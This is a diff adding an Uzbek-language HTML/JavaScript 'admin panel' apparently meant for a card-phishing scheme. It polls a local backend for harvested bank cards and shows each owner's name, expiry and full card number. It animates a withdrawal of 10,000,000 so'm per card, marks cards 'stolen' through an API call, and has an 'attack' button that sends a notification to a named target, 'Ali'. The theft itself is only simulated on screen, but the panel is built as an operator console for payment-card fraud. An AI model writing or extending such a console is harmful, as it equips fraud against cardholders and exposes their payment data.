@@ -1,0 +1,646 @@
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Admin Panel — Azim</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+
+    :root {
+      --bg:      #090e14;
+      --surface: #0d1520;
+      --border:  #1a2535;
+      --green:   #00ff88;
+      --red:     #ff3b3b;
+      --gold:    #ffd700;
+      --text:    #c8d6e5;
+      --dim:     #4a5568;
+    }
+
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: 'Courier New', monospace;
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    /* Matrix rain background */
+    #matrix-canvas {
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      opacity: .04;
+      z-index: 0;
+      pointer-events: none;
+    }
+
+    .layout {
+      position: relative;
+      z-index: 1;
+      max-width: 1100px;
+      margin: 0 auto;
+      padding: 24px;
+    }
+
+    /* Header */
+    .header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      margin-bottom: 28px;
+      padding-bottom: 18px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .header-left { display: flex; align-items: center; gap: 14px; }
+
+    .header-icon {
+      width: 44px;
+      height: 44px;
+      border-radius: 8px;
+      background: linear-gradient(135deg, #0d3a1a, #145a2a);
+      border: 1px solid #1a4a28;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 1.4rem;
+    }
+
+    .header-title {
+      font-size: 1.1rem;
+      font-weight: 700;
+      color: var(--green);
+      letter-spacing: 1px;
+    }
+
+    .header-sub {
+      font-size: .72rem;
+      color: var(--dim);
+      margin-top: 2px;
+    }
+
+    .live-badge {
+      display: flex;
+      align-items: center;
+      gap: 6px;
+      background: rgba(0,255,136,.08);
+      border: 1px solid rgba(0,255,136,.2);
+      padding: 5px 12px;
+      border-radius: 20px;
+      font-size: .72rem;
+      color: var(--green);
+    }
+
+    .live-dot {
+      width: 7px;
+      height: 7px;
+      border-radius: 50%;
+      background: var(--green);
+      animation: blink .8s infinite;
+    }
+
+    @keyframes blink { 0%,100%{opacity:1} 50%{opacity:.2} }
+
+    /* Stats row */
+    .stats {
+      display: grid;
+      grid-template-columns: repeat(3, 1fr);
+      gap: 16px;
+      margin-bottom: 28px;
+    }
+
+    .stat-card {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      padding: 18px 20px;
+    }
+
+    .stat-num {
+      font-size: 1.9rem;
+      font-weight: 700;
+      color: var(--green);
+      font-family: 'Courier New', monospace;
+    }
+
+    .stat-lbl { font-size: .72rem; color: var(--dim); margin-top: 4px; text-transform: uppercase; letter-spacing: .5px; }
+
+    /* Section */
+    .section-title {
+      font-size: .75rem;
+      color: var(--dim);
+      text-transform: uppercase;
+      letter-spacing: 1.5px;
+      margin-bottom: 14px;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .section-title::after {
+      content: '';
+      flex: 1;
+      height: 1px;
+      background: var(--border);
+    }
+
+    /* Cards feed */
+    #cardsFeed { display: flex; flex-direction: column; gap: 14px; }
+
+    .card-item {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: 10px;
+      overflow: hidden;
+      transform: translateX(-40px);
+      opacity: 0;
+      animation: slideIn .5s cubic-bezier(.175,.885,.32,1.275) forwards;
+    }
+
+    @keyframes slideIn {
+      to { transform: translateX(0); opacity: 1; }
+    }
+
+    .card-top {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      padding: 14px 18px;
+      border-bottom: 1px solid var(--border);
+    }
+
+    .card-number {
+      font-size: 1.05rem;
+      letter-spacing: 3px;
+      color: var(--text);
+      font-weight: 700;
+    }
+
+    .card-number .masked { color: var(--dim); }
+
+    .card-meta {
+      display: flex;
+      gap: 20px;
+      padding: 12px 18px;
+      font-size: .8rem;
+    }
+
+    .card-meta-item { display: flex; flex-direction: column; gap: 3px; }
+    .card-meta-item .lbl { color: var(--dim); font-size: .68rem; text-transform: uppercase; letter-spacing: .5px; }
+    .card-meta-item .val { color: var(--text); }
+
+    .card-time {
+      font-size: .72rem;
+      color: var(--dim);
+      background: rgba(255,255,255,.03);
+      padding: 4px 10px;
+      border-radius: 4px;
+    }
+
+    /* Progress bar */
+    .steal-section { padding: 0 18px 16px; }
+
+    .steal-label {
+      font-size: .75rem;
+      color: var(--dim);
+      margin-bottom: 8px;
+      display: flex;
+      justify-content: space-between;
+    }
+
+    .steal-label .status { color: var(--green); }
+
+    .progress-bar {
+      height: 6px;
+      background: rgba(255,255,255,.06);
+      border-radius: 3px;
+      overflow: hidden;
+    }
+
+    .progress-fill {
+      height: 100%;
+      width: 0%;
+      background: linear-gradient(90deg, #00c853, var(--green));
+      border-radius: 3px;
+      box-shadow: 0 0 8px rgba(0,255,136,.4);
+      transition: width .05s linear;
+    }
+
+    /* Success state */
+    .stolen-banner {
+      display: none;
+      align-items: center;
+      gap: 10px;
+      background: rgba(0,255,136,.06);
+      border: 1px solid rgba(0,255,136,.2);
+      border-radius: 8px;
+      padding: 12px 16px;
+      margin: 0 18px 16px;
+      animation: popIn .4s cubic-bezier(.175,.885,.32,1.275);
+    }
+
+    .stolen-banner.show { display: flex; }
+
+    @keyframes popIn {
+      0%  { transform: scale(.9); opacity: 0; }
+      100%{ transform: scale(1);  opacity: 1; }
+    }
+
+    .stolen-icon {
+      width: 36px; height: 36px;
+      border-radius: 50%;
+      background: rgba(0,255,136,.15);
+      border: 1px solid rgba(0,255,136,.3);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 1rem; flex-shrink: 0;
+    }
+
+    .stolen-text .amount {
+      font-size: 1.05rem;
+      font-weight: 700;
+      color: var(--green);
+    }
+
+    .stolen-text .sub {
+      font-size: .72rem;
+      color: var(--dim);
+      margin-top: 2px;
+    }
+
+    /* Empty state */
+    .empty {
+      text-align: center;
+      padding: 60px 20px;
+      color: var(--dim);
+    }
+
+    .empty .icon { font-size: 2.5rem; margin-bottom: 12px; opacity: .4; }
+    .empty p { font-size: .85rem; }
+
+    /* Clear btn */
+    .clear-btn {
+      background: rgba(255,59,59,.08);
+      border: 1px solid rgba(255,59,59,.2);
+      color: var(--red);
+      padding: 6px 14px;
+      border-radius: 6px;
+      font-size: .75rem;
+      cursor: pointer;
+      font-family: inherit;
+      transition: background .2s;
+    }
+
+    .clear-btn:hover { background: rgba(255,59,59,.15); }
+
+    /* Attack button */
+    .attack-btn {
+      background: linear-gradient(135deg, rgba(0,255,136,.12), rgba(0,255,136,.06));
+      border: 1px solid rgba(0,255,136,.35);
+      color: var(--green);
+      padding: 8px 20px;
+      border-radius: 8px;
+      font-size: .85rem;
+      font-weight: 700;
+      cursor: pointer;
+      font-family: 'Courier New', monospace;
+      letter-spacing: .5px;
+      transition: all .2s;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .attack-btn:hover {
+      background: rgba(0,255,136,.18);
+      box-shadow: 0 0 16px rgba(0,255,136,.2);
+    }
+
+    .attack-btn:active { transform: scale(.97); }
+
+    .attack-btn.sent {
+      border-color: rgba(0,200,83,.5);
+      color: #00c853;
+      pointer-events: none;
+    }
+
+    .attack-btn .btn-dot {
+      width: 7px; height: 7px;
+      border-radius: 50%;
+      background: var(--green);
+      animation: blink .8s infinite;
+    }
+
+    /* Attack section */
+    .attack-section {
+      background: rgba(0,255,136,.04);
+      border: 1px solid rgba(0,255,136,.12);
+      border-radius: 10px;
+      padding: 18px 20px;
+      margin-bottom: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      gap: 16px;
+    }
+
+    .attack-info .title {
+      font-size: .85rem;
+      font-weight: 700;
+      color: var(--green);
+      margin-bottom: 4px;
+    }
+
+    .attack-info .sub {
+      font-size: .72rem;
+      color: var(--dim);
+    }
+
+    .sent-badge {
+      display: none;
+      align-items: center;
+      gap: 6px;
+      font-size: .78rem;
+      color: #00c853;
+      background: rgba(0,200,83,.08);
+      border: 1px solid rgba(0,200,83,.2);
+      padding: 5px 12px;
+      border-radius: 20px;
+    }
+
+    .sent-badge.show { display: flex; }
+
+    /* Total amount ticker */
+    .total-ticker {
+      background: rgba(255,215,0,.05);
+      border: 1px solid rgba(255,215,0,.15);
+      border-radius: 8px;
+      padding: 14px 20px;
+      margin-bottom: 24px;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .total-ticker .lbl { font-size: .75rem; color: var(--dim); text-transform: uppercase; }
+    .total-ticker .amount { font-size: 1.6rem; font-weight: 700; color: var(--gold); }
+  </style>
+</head>
+<body>
+
+<canvas id="matrix-canvas"></canvas>
+
+<div class="layout">
+
+  <div class="header">
+    <div class="header-left">
+      <div class="header-icon">⚡</div>
+      <div>
+        <div class="header-title">AZIM // ADMIN PANEL</div>
+        <div class="header-sub">Kiruvchi ma'lumotlar — real vaqt rejimi</div>
+      </div>
+    </div>
+    <div style="display:flex;gap:10px;align-items:center;">
+      <div class="live-badge"><div class="live-dot"></div>JONLI</div>
+      <button class="clear-btn" onclick="clearAll()">Tozalash</button>
+    </div>
+  </div>
+
+  <!-- ATTACK SECTION -->
+  <div class="attack-section">
+    <div class="attack-info">
+      <div class="title">🎯 Nishon: Ali</div>
+      <div class="sub">Bildirishnoma yuborish — Ali ekranida notification paydo bo'ladi</div>
+    </div>
+    <div style="display:flex;align-items:center;gap:10px;">
+      <div class="sent-badge" id="sentBadge">✓ Yuborildi</div>
+      <button class="attack-btn" id="attackBtn" onclick="sendNotification()">
+        <div class="btn-dot"></div>
+        Hujumni boshlash
+      </button>
+    </div>
+  </div>
+
+  <div class="stats">
+    <div class="stat-card">
+      <div class="stat-num" id="statCount">0</div>
+      <div class="stat-lbl">Kirgan kartalar</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-num" id="statStolen">0</div>
+      <div class="stat-lbl">Yechib olindi</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-num" id="statTotal" style="color:var(--gold);">0</div>
+      <div class="stat-lbl">Jami so'm (mln)</div>
+    </div>
+  </div>
+
+  <div class="total-ticker">
+    <div class="lbl">💰 Jami yechib olingan</div>
+    <div class="amount" id="totalAmount">0 so'm</div>
+  </div>
+
+  <div class="section-title">Kartalar lenti</div>
+
+  <div id="cardsFeed">
+    <div class="empty" id="emptyState">
+      <div class="icon">📡</div>
+      <p>Hali ma'lumot kelmadi...<br>Kutilmoqda</p>
+    </div>
+  </div>
+
+</div>
+
+<script>
+const API = 'http://localhost:8001';
+
+let knownIds   = new Set();
+let stolenIds  = new Set();
+let totalStolen = 0;
+
+/* ── Polling ── */
+async function poll() {
+  try {
+    const res   = await fetch(`${API}/api/cards`);
+    const cards = await res.json();
+
+    document.getElementById('statCount').textContent = cards.length;
+    const stolen = cards.filter(c => c.status === 'stolen').length;
+    document.getElementById('statStolen').textContent = stolen;
+    document.getElementById('statTotal').textContent  = stolen * 10;
+
+    const totalSum = stolen * 10_000_000;
+    document.getElementById('totalAmount').textContent =
+      totalSum.toLocaleString('uz-UZ') + ' so\'m';
+
+    if (cards.length > 0) {
+      document.getElementById('emptyState')?.remove();
+    }
+
+    cards.forEach(card => {
+      if (!knownIds.has(card.id)) {
+        knownIds.add(card.id);
+        addCardToFeed(card);
+      }
+    });
+  } catch (_) {}
+}
+
+function formatCard(num) {
+  const n = num.replace(/\D/g, '').padEnd(16, '0');
+  return `${n.slice(0,4)} ${n.slice(4,8)} **** ${n.slice(12,16)}`;
+}
+
+function addCardToFeed(card) {
+  const feed = document.getElementById('cardsFeed');
+
+  const el = document.createElement('div');
+  el.className = 'card-item';
+  el.id        = `card-${card.id}`;
+  el.innerHTML = `
+    <div class="card-top">
+      <div class="card-number">${formatCard(card.number)}</div>
+      <div class="card-time">${card.time}</div>
+    </div>
+    <div class="card-meta">
+      <div class="card-meta-item"><div class="lbl">Egasi</div><div class="val">${card.name}</div></div>
+      <div class="card-meta-item"><div class="lbl">Muddat</div><div class="val">${card.expiry}</div></div>
+      <div class="card-meta-item"><div class="lbl">Raqam (to'liq)</div><div class="val" style="color:#ff9800;">${card.number.replace(/\D/g,'').replace(/(.{4})/g,'$1 ').trim()}</div></div>
+      <div class="card-meta-item"><div class="lbl">Holat</div><div class="val status-${card.id}" style="color:#ffd700;">Qayta ishlanmoqda</div></div>
+    </div>
+    <div class="steal-section">
+      <div class="steal-label">
+        <span>Pul yechilmoqda...</span>
+        <span class="status pct-${card.id}">0%</span>
+      </div>
+      <div class="progress-bar">
+        <div class="progress-fill" id="fill-${card.id}"></div>
+      </div>
+    </div>
+    <div class="stolen-banner" id="banner-${card.id}">
+      <div class="stolen-icon">✓</div>
+      <div class="stolen-text">
+        <div class="amount">10,000,000 so'm yechib olindi!</div>
+        <div class="sub">Karta: ${formatCard(card.number)} &nbsp;|&nbsp; ${card.time}</div>
+      </div>
+    </div>
+  `;
+
+  feed.insertBefore(el, feed.firstChild);
+
+  if (card.status === 'stolen') {
+    showStolenState(card.id, true);
+  } else {
+    startProgressAnimation(card.id);
+  }
+}
+
+function startProgressAnimation(cardId) {
+  let pct = 0;
+  const fill   = document.getElementById(`fill-${cardId}`);
+  const pctEl  = document.querySelector(`.pct-${cardId}`);
+  const statusEl = document.querySelector(`.status-${cardId}`);
+
+  if (!fill) return;
+
+  const interval = setInterval(() => {
+    pct += Math.random() * 4 + 1;
+    if (pct >= 100) {
+      pct = 100;
+      clearInterval(interval);
+      setTimeout(() => showStolenState(cardId), 400);
+    }
+    fill.style.width  = pct + '%';
+    if (pctEl) pctEl.textContent = Math.floor(pct) + '%';
+  }, 80);
+}
+
+function showStolenState(cardId, instant = false) {
+  const fill    = document.getElementById(`fill-${cardId}`);
+  const banner  = document.getElementById(`banner-${cardId}`);
+  const statusEl = document.querySelector(`.status-${cardId}`);
+  const stealSection = banner?.previousElementSibling;
+
+  if (fill)   fill.style.width = '100%';
+  if (statusEl) { statusEl.textContent = '✓ Bajarildi'; statusEl.style.color = 'var(--green)'; }
+
+  setTimeout(() => {
+    if (stealSection) stealSection.style.display = 'none';
+    if (banner) banner.classList.add('show');
+  }, instant ? 0 : 300);
+
+  if (!stolenIds.has(cardId)) {
+    stolenIds.add(cardId);
+    fetch(`${API}/api/cards/${cardId}/steal`, { method: 'POST' }).catch(() => {});
+  }
+}
+
+async function clearAll() {
+  if (!confirm('Barcha ma\'lumotlarni o\'chirish?')) return;
+  await fetch(`${API}/api/cards`, { method: 'DELETE' });
+  knownIds.clear();
+  stolenIds.clear();
+  document.getElementById('cardsFeed').innerHTML =
+    '<div class="empty" id="emptyState"><div class="icon">📡</div><p>Hali ma\'lumot kelmadi...<br>Kutilmoqda</p></div>';
+  document.getElementById('statCount').textContent  = '0';
+  document.getElementById('statStolen').textContent = '0';
+  document.getElementById('statTotal').textContent  = '0';
+  document.getElementById('totalAmount').textContent = '0 so\'m';
+}
+
+/* ── Matrix rain ── */
+const canvas = document.getElementById('matrix-canvas');
+const ctx    = canvas.getContext('2d');
+function resizeCanvas() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+resizeCanvas();
+window.addEventListener('resize', resizeCanvas);
+
+const cols  = Math.floor(canvas.width / 18);
+const drops = Array(cols).fill(1);
+const chars = '01アイウエオカキクケコ0110';
+
+setInterval(() => {
+  ctx.fillStyle = 'rgba(9,14,20,.05)';
+  ctx.fillRect(0, 0, canvas.width, canvas.height);
+  ctx.fillStyle = '#00ff88';
+  ctx.font = '14px Courier New';
+  drops.forEach((y, i) => {
+    const ch = chars[Math.floor(Math.random() * chars.length)];
+    ctx.fillText(ch, i * 18, y * 18);
+    if (y * 18 > canvas.height && Math.random() > .975) drops[i] = 0;
+    drops[i]++;
+  });
+}, 60);
+
+/* ── Send notification to Ali ── */
+async function sendNotification() {
+  const btn  = document.getElementById('attackBtn');
+  const badge = document.getElementById('sentBadge');
+
+  btn.textContent = '📡 Yuborilmoqda...';
+  btn.classList.add('sent');
+
+  try {
+    await fetch(`${API}/api/notify`, { method: 'POST' });
+    btn.innerHTML = '✓ Yuborildi';
+    badge.classList.add('show');
+    setTimeout(() => {
+      btn.innerHTML = '<div class="btn-dot"></div>Hujumni boshlash';
+      btn.classList.remove('sent');
+      badge.classList.remove('show');
+    }, 8000);
+  } catch (_) {
+    btn.innerHTML = '<div class="btn-dot"></div>Hujumni boshlash';
+    btn.classList.remove('sent');
+  }
+}
+
+/* ── Start polling ── */
+poll();
+setInterval(poll, 2000);
+</script>
+
+</body>
+</html>
